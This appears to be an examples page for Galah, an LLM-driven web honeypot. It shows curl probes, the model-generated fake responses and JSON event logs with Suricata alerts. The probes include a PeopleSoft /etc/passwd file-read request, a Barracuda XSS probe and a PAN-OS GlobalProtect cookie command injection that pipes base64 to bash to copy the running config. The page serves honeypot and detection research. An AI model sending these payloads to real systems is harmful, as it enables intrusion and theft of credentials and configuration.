# Examples

### Example 1 

Model: OpenAI's `gpt-4.1-mini`

```bash
./galah --provider openai --model gpt-4.1-mini --cache-duration 0 --suricata-enabled --suricata-rules-dir rules
```

#### Test 1: Oracle PeopleSoft Unauthenticated File Read (CVE-2023-22047)
```bash
curl --http1.1 -g --path-as-is \
  'http://127.0.0.1:8888/RP?wsrp-url=file://etc/passwd' -v
*   Trying 127.0.0.1:8888...
* Connected to 127.0.0.1 (127.0.0.1) port 8888
> GET /RP?wsrp-url=file://etc/passwd HTTP/1.1
> Host: 127.0.0.1:8888
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off

< HTTP/1.1 200 OK
< Server: Apache/2.4.38
< Date: Mon, 21 Apr 2025 00:10:15 GMT
< Content-Length: 1237
< Content-Type: text/plain; charset=utf-8
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:irc:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:103:systemd Network Management,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:104:systemd Resolver,:/run/systemd/resolve:/usr/sbin/nologin
systemd-timesync:x:102:105:systemd Time Synchronization,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
```

JSON event log:
```json
{
  "eventTime": "2025-04-21T01:10:15.480706+01:00",
  "httpRequest": {
    "body": "",
    "bodySha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "headers": {
      "Accept": "*/*",
      "User-Agent": "curl/8.7.1"
    },
    "headersSorted": "Accept,User-Agent",
    "headersSortedSha256": "cf69e186169279bd51769f29d122b07f1f9b7e51bf119c340b66fbd2a1128bc9",
    "method": "GET",
    "protocolVersion": "HTTP/1.1",
    "request": "/RP?wsrp-url=file://etc/passwd",
    "sessionID": "1745194215480759000_AEDFwwaS_Hdi4w==",
    "userAgent": "curl/8.7.1"
  },
  "httpResponse": {
    "headers": {
      "Content-Type": "text/plain; charset=utf-8",
      "Server": "Apache/2.4.38"
    },
    "body": "root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:irc:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:103:systemd Network Management,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:104:systemd Resolver,:/run/systemd/resolve:/usr/sbin/nologin systemd-timesync:x:102:105:systemd Time Synchronization,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin sshd:x:104:65534::/run/sshd:/usr/sbin/nologin "
  },
  "level": "info",
  "msg": "successfulResponse",
  "port": "8888",
  "responseMetadata": {
    "generationSource": "llm",
    "info": {
      "model": "gpt-4.1-mini",
      "provider": "openai",
      "temperature": 1
    }
  },
  "sensorName": "mbp",
  "srcHost": "localhost",
  "srcIP": "127.0.0.1",
  "srcPort": "55817",
  "suricataMatches": [
    {
      "msg": "ET WEB_SPECIFIC_APPS Oracle PeopleSoft Unauthenticated File Read (CVE-2023-22047)",
      "sid": "2061733"
    }
  ],
  "tags": null,
  "time": "2025-04-21T01:10:15.480803+01:00"
}
```

#### Test 2: Barracuda IM Firewall smtp_test.cgi XSS Attempt
```bash
curl -g --path-as-is --http1.1 \
  'http://127.0.0.1:8888/cgi-mod/smtp_test.cgi?email=test@example.com&hostname=myhost&default_domain=example.com&script=alert' -v
*   Trying 127.0.0.1:8888...
* Connected to 127.0.0.1 (127.0.0.1) port 8888
> GET /cgi-mod/smtp_test.cgi?email=test@example.com&hostname=myhost&default_domain=example.com&script=alert HTTP/1.1
> Host: 127.0.0.1:8888
> User-Agent: curl/8.7.1
> Accept: */*
> 
* Request completely sent off

< HTTP/1.1 200 OK
< Server: MiniHttpd/1.0
< Date: Mon, 21 Apr 2025 03:37:18 GMT
< Content-Length: 304
< Content-Type: text/html; charset=utf-8
< 
<!DOCTYPE html><html><head><title>SMTP Test Result</title></head><body><h1>SMTP Test for email: test@example.com</h1><p>Attempting to send test email via host: myhost</p><p>Default domain: example.com</p><script>alert('Test script executed');</script><p>Status: Email sent successfully.</p></body></html>
```

JSON event log:
```json
{
  "eventTime": "2025-04-20T23:47:06.497351+01:00",
  "httpRequest": {
    "body": "",
    "bodySha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "headers": {
      "Accept": "*/*",
      "User-Agent": "curl/8.7.1"
    },
    "headersSorted": "Accept,User-Agent",
    "headersSortedSha256": "cf69e186169279bd51769f29d122b07f1f9b7e51bf119c340b66fbd2a1128bc9",
    "method": "GET",
    "protocolVersion": "HTTP/1.1",
    "request": "/cgi-mod/smtp_test.cgi?email=test@example.com&hostname=myhost&default_domain=example.com&script=alert",
    "sessionID": "1745189115926946000_8egjh7il94OR8g==",
    "userAgent": "curl/8.7.1"
  },
  "httpResponse": {
    "headers": {
      "Content-Type": "text/html; charset=utf-8",
      "Server": "MiniSMTP/1.2.3"
    },
    "body": "<!DOCTYPE html><html><head><title>SMTP Test Result</title></head><body><h2>SMTP Test for test@example.com</h2><p><strong>Hostname:</strong> myhost</p><p><strong>Default Domain:</strong> example.com</p><p><strong>Script Execution:</strong> alert</p><p>Status: <span style=\"color:green;\">Email successfully sent via SMTP server at myhost.example.com</span></p><script>alert(Test completed successfully);</script></body></html>"
  },
  "level": "info",
  "msg": "successfulResponse",
  "port": "8888",
  "responseMetadata": {
    "generationSource": "llm",
    "info": {
      "model": "gpt-4.1-mini",
      "provider": "openai",
      "temperature": 1
    }
  },
  "sensorName": "mbp",
  "srcHost": "localhost",
  "srcIP": "127.0.0.1",
  "srcPort": "50064",
  "suricataMatches": [
    {
      "msg": "ET WEB_SERVER Possible Barracuda IM Firewall smtp_test.cgi Cross-Site Scripting Attempt",
      "sid": "2010462"
    }
  ],
  "tags": null,
  "time": "2025-04-20T23:47:06.497368+01:00"
}
```

### Example 2

Model: Google's `gemini-1.5-pro`

```bash
./galah -p gcp-vertex -m gemini-1.5-pro --cloud-project galah-test --cloud-location us-central1 -t 0.2 --cache-duration 0
```

```bash
curl -i 'http://127.0.0.1:8080/global-protect/login.esp' --cookie "SESSID=.././.././.././.././.././.././.././.././../opt/panlogs/tmp/device_telemetry/minute/'}|{echo,Y3AgL29wdC9wYW5jZmcvbWdtdC9zYXZlZC1jb25maWdzL3J1bm5pbmctY29uZmlnLnhtbCAvdmFyL2FwcHdlYi9zc2x2cG5kb2NzL2dsb2JhbC1wcm90ZWN0L2Rrc2hka2Vpc3NpZGpleXVrZGwuY3Nz}|{base64,-d}|bash|"
HTTP/1.1 200 OK
Connection: close
Content-Security-Policy: default-src 'self'; img-src * data:; object-src 'none'; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline'
Referrer-Policy: strict-origin-when-cross-origin
Server: nginx
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
Date: Sun, 26 May 2024 17:14:43 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>GlobalProtect</title>

    <link href="/global-protect/css/bootstrap.min.css" rel="stylesheet">
    <link href="/global-protect/css/fontawesome.min.css" rel="stylesheet">
    <link href="/global-protect/css/pan-icons.css" rel="stylesheet">
    <link href="/global-protect/css/styles.css" rel="stylesheet">

    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>
<body>

<div class="container-fluid">
    <div class="row">
        <div class="col-sm-6 col-sm-offset-3 col-md-4 col-md-offset-4 login-container">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <img src="/global-protect/images/logo-pan.svg" alt="Logo">
                    <h3>Sign In</h3>
                </div>
                <div class="panel-body">
                    <form action="/global-protect/login.esp" method="post" id="login-form">
                        <input type="hidden" name="tmpfname" value="/opt/pancfg/mgmt/saved-configs/running-config.xml">
                        <input type="hidden" name="prot" value="https">
                        <input type="hidden" name="clientid" value="some-client-id">
                        <div class="form-group">
                            <label for="user" class="sr-only">Username</label>
                            <div class="input-group">
                                <div class="input-group-addon"><i class="fa fa-user"></i></div>
                                <input type="text" class="form-control" id="user" name="user" placeholder="Username" required>
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="passwd" class="sr-only">Password</label>
                            <div class="input-group">
                                <div class="input-group-addon"><i class="fa fa-lock"></i></div>
                                <input type="password" class="form-control" id="passwd" name="passwd" placeholder="Password" required>
                            </div>
                        </div>
                        <div class="form-group">
                            <button type="submit" class="btn btn-primary btn-block">Sign In</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<script src="/global-protect/js/jquery.min.js"></script>
<script src="/global-protect/js/bootstrap.min.js"></script>
</body>
</html>
```

### Example -1

Now, let's do some sort of adversarial testing (Galah v0.9)!

Model: OpenAI's `gpt-4`

```bash
curl http://localhost:8888/are-you-a-honeypot
No, I am a server.
```

JSON event log:
```json
{"timestamp":"2024-01-01T05:50:43.792479","srcIP":"::1","srcHost":"localhost","tags":null,"srcPort":"61982","sensorName":"home-sensor","port":"8888","httpRequest":{"method":"GET","protocolVersion":"HTTP/1.1","request":"/are-you-a-honeypot","userAgent":"curl/7.71.1","headers":"User-Agent: [curl/7.71.1], Accept: [*/*]","headersSorted":"Accept,User-Agent","headersSortedSha256":"cf69e186169279bd51769f29d122b07f1f9b7e51bf119c340b66fbd2a1128bc9","body":"","bodySha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},"httpResponse":{"headers":{"Connection":"close","Content-Length":"20","Content-Type":"text/plain","Server":"Apache/2.4.41 (Ubuntu)"},"body":"No, I am a server."}}
```

😑

```bash
curl http://localhost:8888/i-mean-are-you-a-fake-server
No, I am not a fake server.
```

JSON log record:
```json
{"timestamp":"2024-01-01T05:51:40.812831","srcIP":"::1","srcHost":"localhost","tags":null,"srcPort":"62205","sensorName":"home-sensor","port":"8888","httpRequest":{"method":"GET","protocolVersion":"HTTP/1.1","request":"/i-mean-are-you-a-fake-server","userAgent":"curl/7.71.1","headers":"User-Agent: [curl/7.71.1], Accept: [*/*]","headersSorted":"Accept,User-Agent","headersSortedSha256":"cf69e186169279bd51769f29d122b07f1f9b7e51bf119c340b66fbd2a1128bc9","body":"","bodySha256":"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"},"httpResponse":{"headers":{"Connection":"close","Content-Type":"text/plain","Server":"LocalHost/1.0"},"body":"No, I am not a fake server."}}
```

You're a [galah](https://www.macquariedictionary.com.au/blog/article/728/), mate!
